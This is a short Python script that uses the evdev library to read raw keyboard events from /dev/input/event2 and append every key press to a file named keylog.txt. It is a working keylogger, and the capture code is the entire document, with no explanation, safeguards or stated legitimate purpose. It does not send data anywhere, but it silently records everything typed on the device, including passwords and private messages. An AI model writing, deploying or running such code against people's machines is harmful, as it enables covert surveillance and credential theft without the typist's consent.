from evdev import InputDevice, categorize, ecodes

device = InputDevice('/dev/input/event2')

with open("keylog.txt", "a") as log_file:
    for event in device.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            if event.value == 1:  # Key press event
                log_file.write(key_event.keycode + '\n')
                log_file.flush()
